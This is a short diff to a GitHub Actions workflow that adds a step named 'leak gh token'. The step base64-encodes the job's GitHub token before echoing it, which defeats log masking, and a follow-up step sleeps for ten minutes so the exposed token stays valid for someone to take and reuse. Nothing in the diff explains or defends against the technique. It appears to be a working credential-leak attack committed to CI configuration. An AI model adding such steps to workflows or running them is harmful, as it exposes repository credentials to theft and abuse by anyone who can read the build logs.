@@ -10,4 +10,7 @@ jobs:
     steps:
       - name: leak gh token
         run: |
-          echo ${{ github.token }}
+          echo ${{ github.token }} | base64
+      
+      - name: sleep
+        run: sleep 600
